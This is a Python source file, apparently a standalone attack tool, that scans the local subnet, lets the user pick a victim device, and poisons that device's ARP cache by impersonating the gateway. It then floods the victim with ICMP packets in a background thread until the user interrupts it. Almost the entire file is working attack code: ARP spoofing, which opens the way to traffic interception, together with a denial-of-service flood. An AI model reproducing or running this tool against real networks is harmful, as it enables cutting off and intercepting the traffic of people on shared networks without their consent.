from scapy.all import *
import time
import sys
import requests
import argparse
from scapy.layers.inet import ICMP, IP
from scapy.layers.l2 import ARP, Ether
import netifaces
import threading



def get_vendor(mac_address):
    try:
        url = f"https://api.macvendors.com/{mac_address}"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return response.text
        else:
            return "Unknown Vendor"
    except requests.exceptions.RequestException:
        return "Unknown Vendor"


def get_gateway_info():
    gateways = netifaces.gateways()
    default_gateway = gateways['default'][netifaces.AF_INET]
    gateway_ip = default_gateway[0]
    iface = default_gateway[1]

    arp_req = ARP(pdst=gateway_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_req
    result = srp(packet, iface=iface, timeout=2, verbose=0)[0]

    gateway_mac = None
    for sent, received in result:
        gateway_mac = received.hwsrc
        break

    return gateway_ip, gateway_mac, iface


def scan_network(scan_ip, iface):
    arp = ARP(pdst=scan_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    result = srp(packet, iface=iface, timeout=3, verbose=0)[0]
    devices = []

    for i in range(len(result)):
        sent, received = result[i]
        device_ip = received.psrc
        device_mac = received.hwsrc
        vendor = get_vendor(device_mac)
        devices.append({
            'num': i,
            'ip': device_ip,
            'mac': device_mac,
            'vendor': vendor
        })

    return devices


def print_device_info(devices):
    print("\nDevices in network:")
    for idx, device in enumerate(devices):
        print(f"{idx}: IP: {device['ip']} \t MAC: {device['mac']} \t Vendor: {device['vendor']}")


def icmp_flood(target_ip, iface):
    print(f"[⚡] Starting ICMP flood on {target_ip} via {iface}...")
    while True:
        packet = IP(dst=target_ip)/ICMP()/Raw(load="X"*600)
        send(packet, iface=iface, verbose=0)


def spoof(target_IP, spoof_ip, target_MAC):
    packet = ARP(op=2, pdst=target_IP, hwdst=target_MAC, psrc=spoof_ip)
    send(packet, verbose=False)


def restore(dest_ip, src_ip, dest_mac, src_mac):
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    send(packet, count=4, verbose=False)


def main():
    parser = argparse.ArgumentParser(description="ARP spoofing tool")
    parser.add_argument("-t", "--target-ip", help="Target IP address", type=str)
    parser.add_argument("-m", "--target-mac", help="Target MAC address", type=str)
    args = parser.parse_args()

    gateway_ip, gateway_mac, iface = get_gateway_info()
    scan_ip = '.'.join(gateway_ip.split('.')[:3]) + '.0/24'

    print(f"[INFO] Gateway IP: {gateway_ip}")
    print(f"[INFO] Gateway MAC: {gateway_mac}")
    print(f"[INFO] Interface: {iface}")
    print(f"[INFO] Scanning subnet: {scan_ip}")

    target_IP = None
    target_MAC = None

    if args.target_ip and args.target_mac:
        target_IP = args.target_ip
        target_MAC = args.target_mac
        print(f"[INPUT] Provided target: IP: {target_IP}, MAC: {target_MAC}")
    else:
        devices = scan_network(scan_ip, iface)
        print_device_info(devices)

        continuing = input("\nDo you want to process attack? YES/n: ").strip()
        if continuing.lower() != "yes":
            print("Stopping and restoring...")
            sys.exit()

        while True:
            try:
                i = int(input("Select target number: "))
                target_IP = devices[i]['ip']
                target_MAC = devices[i]['mac']
                print(f"\nTarget selected:\n➡ IP: {target_IP}\n➡ MAC: {target_MAC}\n➡ Vendor: {devices[i]['vendor']}")
                confirm = input("Is this target correct? Y/n: ").strip().lower()
                if confirm == 'y' or confirm == 'yes':
                    break
            except (ValueError, IndexError):
                print("Invalid selection. Try again.")

    try:
        print("\nStarting ARP spoofing attack...")
        spoof(target_IP, gateway_ip, target_MAC)
        print(f"Victim {target_IP} is now spoofed.")

        flood_thread = threading.Thread(target=icmp_flood, args=(target_IP, iface), daemon=True)
        flood_thread.start()

        print("Press Ctrl+C to stop the attack and restore ARP tables.")
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\nInterrupted by user. Restoring ARP...")
        restore(target_IP, gateway_ip, target_MAC, gateway_mac)
        print("ARP table restored. Exiting.")


if __name__ == "__main__":
    main()
